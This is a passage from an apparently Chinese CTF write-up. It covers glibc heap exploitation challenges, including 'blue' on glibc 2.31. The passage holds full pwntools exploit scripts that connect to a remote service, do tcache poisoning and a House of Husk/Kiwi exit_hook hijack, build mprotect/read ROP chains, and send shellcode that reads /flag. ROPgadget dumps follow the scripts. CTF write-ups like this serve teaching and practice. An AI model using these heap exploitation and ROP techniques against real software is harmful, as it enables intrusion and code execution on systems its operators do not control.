add()
dele(0)
show(0)
heap_leak = uu64(ru('\n'))
heap_base = heap_leak <<12
lg('heap_leak',heap_leak)
lg('heap_base',heap_base)

for i in range(10):
    add() # 9

for i in range(1,2+8):
    dele(i)
edit(8,'u')
show(8)
libc_leak = uu64(ru('\x7f',drop=False)[-6:])
libc_base = libc_leak - 0x1e0c75
lg('libc_leak',libc_leak)
lg('libc_base',libc_base)
#libc = ELF('./libc.so.6')
libc = elf.libc
libc.address = libc_base
system_addr = libc.sym.system
bin_sh = libc.search('/bin/sh').next()
edit(8,'\0')

stderr = libc_base + 0x1f3680
sync = libc_base + 0x1e24a0 + 0x60
magic = libc_base + 0x529ad
helper = libc_base + 0x1e1940
ret = libc_base + 0x0000000000026699
rdi = libc_base + 0x0000000000028a55
rsi = libc_base + 0x000000000002a4cf
rdx = libc_base + 0x00000000000c7f32
addr = heap_base + 0x400

mmp = flat([
    0,rdi,((addr)>>12)<<12,rsi,0x2000,rdx,7,libc.sym.mprotect,rdi,0,rsi,addr+0x400,rdx,0x100,libc.sym.read,libc_base + 0x00000000000506b1
])

edit(0,mmp)
# edit(1,mmp)

edit(7,p64(heap_leak^(heap_base+0x100)))
add() # 11
# pause()
add() # 12
edit(12,p64(helper)*2)
lg('ADDR',(heap_base+0x100))
add() # 13
edit(13,p64(heap_base+0x2a8)+p64(ret))
edit(12,p64(sync)*2)
add()
edit(14,p64(magic))

for i in range(3):
    edit(12,p64(heap_base+0xd30)*2)
    add()
    edit(15,p64(0)*2)

add()
add()
add()

# # add()
sleep(2)
sl(asm(shellcraft.cat('/flag')))
p.interactive()

'''
0x0000000000028a55 : pop rdi ; ret
0x0000000000112a51 : pop rdx ; pop r12 ; ret
0x00000000001574e6 : pop rdx ; pop rbx ; ret
0x00000000000fc103 : pop rdx ; pop rcx ; pop rbx ; ret
0x00000000000c7f32 : pop rdx ; ret
0x0000000000095982 : pop rdx ; ret 0x11
0x0000000000093342 : pop rdx ; ret 0xfffc
0x0000000000028db0 : pop rsi ; pop r15 ; pop rbp ; ret
0x0000000000028a53 : pop rsi ; pop r15 ; ret
0x000000000002a4cf : pop rsi ; ret
0x0000000000028dac : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000028a4f : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000002a4cb : pop rsp ; pop r13 ; pop r14 ; ret
0x0000000000043922 : pop rsp ; pop r13 ; pop rbp ; ret
0x000000000002a04c : pop rsp ; pop r13 ; ret
0x00000000000de0e6 : pop rsp ; pop rbp ; ret
0x0000000000033af2 : pop rsp ; ret
0x0000000000026699 : ret
'''
```

### blue

![image-20220619194659319](https://res.cloudinary.com/sycamore/image/upload/v1682444986/Typera/2023/04/8e1ce7b9cbee53accfec12b7b98f925a.png)

**flag{8c65b8bd2169f2cf662ae9e324aaef66}**

Ubuntu GLIBC 2.31-0ubuntu9.8 的堆题，IO jumps 段不可写，没有办法按传统思路走。

**思路**

1. 利用后门函数，类似 House of botcake 的手法完成堆块重叠的同时 leak 出 libc。
2. 设置好 House of Husk 的处理函数为 exit
3. 设置好 exit_hook 的俩个函数分别为 gets 和 `svcudp_reply+26`。
4. 用 House of Kiwi 触发 exit 调用 exit_hook 完成栈迁移执行 shellcode 读取 flag。

**Exp**

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *
from LibcSearcher import *

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

elf = ELF('./pwn')
context(arch = elf.arch, os = 'linux',log_level = 'debug',terminal = ['tmux', 'splitw', '-hp','62'])
#p = process('./pwn')
#debug()
p = remote('192.168.166.147',58012)

def menu(c):
    sla('Choice: ',str(c))

def add(size,data='u'):
    menu(1)
    sla('Please input size: ',str(size))
    sea('Please input content: ',str(data))

def dele(id):
    menu(2)
    sla('Please input idx: ',str(id))

def show(id):
    menu(3)
    sla('Please input idx: ',str(id))

def bkdoor(id):
    menu(666)
    sla('Please input idx: ',str(id))

for i in range(20):
    add(0x80)

for i in range(7):
    dele(6-i)

# 8 9 11
bkdoor(9)
show(9)
libc_leak = uu64(ru('\x7f',drop=False)[-6:])
libc_base = libc_leak - 0x1ecbe0
lg('libc_leak',libc_leak)
lg('libc_base',libc_base)
#libc = ELF('./libc.so.6')
libc = elf.libc
libc.address = libc_base
system_addr = libc.sym.system
bin_sh = libc.search('/bin/sh').next()

__printf_arginfo_table = libc_base + 0x1ed7b0
__printf_function_table = libc_base + 0x1f1318
lock = libc_base + 0x222f68 # _rtld_global+3848
main_arena_x96 = libc_base + 0x1ecbe0
magic = libc_base + 0x154dea

dele(8)
add(0x80) # 0
dele(9)

# add(0x10) # 1 
# add(0x20,'\0'*0x10+p64()) # 2 
# # 7a0 
add(0x80) # 1
add(0x90,'\0'*0x88+p32(0x90*9+1)) # 2
for i in range(6):
    add(0x80,p64(libc.sym.exit)*(0x80/8)) # 3
add(0x70)
# add(0x80) # 4
dele(1)
dele(11)
dele(10)

add(0x40)
add(0x50,p64(0)*6+p64(0x80)+p64(0x91)+p64(__printf_arginfo_table)+p64(0))
add(0x88) # 20
add(0x88,p64(__printf_arginfo_table + 8 - 0x378)+p64(libc.sym.exit)*12) # 21

dele(13)
dele(12)
add(0x90)
add(0x90,'\0'*0x58+p64(0x91)+p64(__printf_function_table)+p64(0))
add(0x80)
add_rsp_x28 = libc_base + 0x0000000000047445
leave_ret = libc_base + 0x00000000000578c8
ret = libc_base + 0x0000000000022679
rdi = libc_base +0x0000000000023b6a
rsi = libc_base + 0x000000000002601f
rdx_r12 = libc_base + 0x0000000000119211

add(0x80,p64(main_arena_x96+0x20)+p64(0)+p64(add_rsp_x28)*2+p64(__printf_function_table+8)+p64(0)+p64(leave_ret)+p64(0)+p64(rdi)+p64(0)+p64(rsi)+p64(__printf_function_table+0x78)+p64(rdx_r12)+p64(0x1000)+p64(0)+p64(libc.sym.read))

dele(14)
dele(15)
add(0x90)
add(0x90)
add(0x90,'\0'*0x28+p64(0x91)+p64(lock)+p64(0)) # _dl_fini+113
add(0x80)
add(0x80,p64(libc.sym.gets)+p64(magic))

dele(16)
dele(17)
add(0x90)
add(0x90,'\0'*8+p64(0x91)+p64(main_arena_x96))
# add(0x90,'\0'*0x28+p64(0x91)+p64(lock)+p64(0))
add(0x80)
add(0x80,'\xa0')
# pause()
menu(1)
sla('Please input size: ',str(0x80))
# show(21)
# dele(20)
# add(1)
addr = (libc.sym.__free_hook>>12)<<12
fuck = SigreturnFrame()
fuck.rdi = 0
fuck.rsi = addr
fuck.rdx = 0x300
fuck.rsp = addr + 8
fuck.rip = libc.sym.read
lock_rdi = 0x222968 + libc_base
sleep(2)
sl('a'*0x48+p64(__printf_function_table+8))

mmp = flat([
    0,rdi,((addr)>>12)<<12,rsi,0x2000,rdx_r12,7,0,libc.sym.mprotect,rdi,0,rsi,addr+0x400,rdx_r12,0x100,0,libc.sym.read,libc_base + 0x000000000010d5dd
])
sleep(1)
sl(mmp)

sl(asm(shellcraft.cat('/flag')))

p.interactive()

'''
0x00000000000248f1 : pop r15 ; pop rbp ; ret
0x0000000000023b69 : pop r15 ; ret
0x000000000005520f : pop rax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000000226be : pop rax ; pop rbx ; pop rbp ; ret
0x000000000015f8c5 : pop rax ; pop rdx ; pop rbx ; ret
0x0000000000036174 : pop rax ; ret
0x0000000000023b62 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000026019 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000000ef193 : pop rbp ; pop r12 ; pop r13 ; pop r15 ; ret
0x0000000000025b9a : pop rbp ; pop r12 ; pop r13 ; ret
0x000000000008e22f : pop rbp ; pop r12 ; pop r14 ; ret
0x000000000002f708 : pop rbp ; pop r12 ; ret
0x000000000013641e : pop rbp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000000248ee : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000023b66 : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000002601d : pop rbp ; pop r14 ; ret
0x00000000000ef197 : pop rbp ; pop r15 ; ret
0x0000000000046077 : pop rbp ; pop rbp ; ret
0x0000000000055bb8 : pop rbp ; pop rbx ; ret
0x00000000000226c0 : pop rbp ; ret
0x000000000010feb0 : pop rbx ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000046073 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000062569 : pop rbx ; pop r12 ; pop r13 ; ret
0x000000000005b937 : pop rbx ; pop r12 ; ret
0x000000000003040a : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000000ef192 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r15 ; ret
0x0000000000025b99 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000008e22e : pop rbx ; pop rbp ; pop r12 ; pop r14 ; ret
0x000000000002f830 : pop rbx ; pop rbp ; pop r12 ; ret
0x000000000013641d : pop rbx ; pop rbp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000196c62 : pop rbx ; pop rbp ; pop r14 ; ret
0x00000000000226bf : pop rbx ; pop rbp ; ret
0x000000000002fdaf : pop rbx ; ret
0x0000000000119150 : pop rcx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000001587d3 : pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000010257e : pop rcx ; pop rbx ; ret
0x0000000000118d4f : pop rcx ; ret 0xf66
0x00000000000248f2 : pop rdi ; pop rbp ; ret
0x0000000000023b6a : pop rdi ; ret
0x0000000000119211 : pop rdx ; pop r12 ; ret
0x000000000015f8c6 : pop rdx ; pop rbx ; ret
0x000000000010257d : pop rdx ; pop rcx ; pop rbx ; ret
0x0000000000142c92 : pop rdx ; ret
0x00000000000dfc12 : pop rdx ; ret 0x10
0x00000000000248f0 : pop rsi ; pop r15 ; pop rbp ; ret
0x0000000000023b68 : pop rsi ; pop r15 ; ret
0x000000000002601f : pop rsi ; ret
0x00000000000248ec : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000023b64 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000002601b : pop rsp ; pop r13 ; pop r14 ; ret
0x00000000000ef195 : pop rsp ; pop r13 ; pop r15 ; ret
0x0000000000046075 : pop rsp ; pop r13 ; pop rbp ; ret
0x0000000000025b9c : pop rsp ; pop r13 ; ret
0x000000000008e231 : pop rsp ; pop r14 ; ret
0x000000000012cf7e : pop rsp ; pop rbp ; ret
0x000000000002f70a : pop rsp ; ret
0x0000000000099020 : pop rsp ; ret 0xffff
0x0000000000022679 : ret
'''
```
